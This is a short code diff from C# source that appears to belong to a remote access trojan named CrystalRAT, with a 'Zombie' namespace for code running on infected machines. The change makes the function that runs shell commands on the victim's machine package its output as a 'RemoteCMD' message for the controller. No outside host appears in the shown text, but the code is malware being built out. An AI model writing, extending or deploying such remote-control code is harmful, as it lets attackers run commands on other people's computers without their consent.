@@ -1,4 +1,6 @@
-﻿using System;
+﻿using CrystalRATShared.Commands;
+using CrystalRATShared.Serialization;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -26,7 +28,7 @@ namespace Zombie.Functions
         public static string LaunchDirectory { get; private set; }
         public static string WorkingDirectory { get; private set; }
 
-        public static string ExecuteCommand(string command)
+        public static byte[] ExecuteCommand(string command)
         {
             string commandOutput = "";
             bool changeDir = false;
@@ -86,7 +88,7 @@ namespace Zombie.Functions
 
             pProcess.Dispose();
 
-            return commandOutput;
+            return CommandDataSerializer.Serialize(CommandFlags.RemoteCMD, writer => writer.Write(commandOutput));
 
         }
 
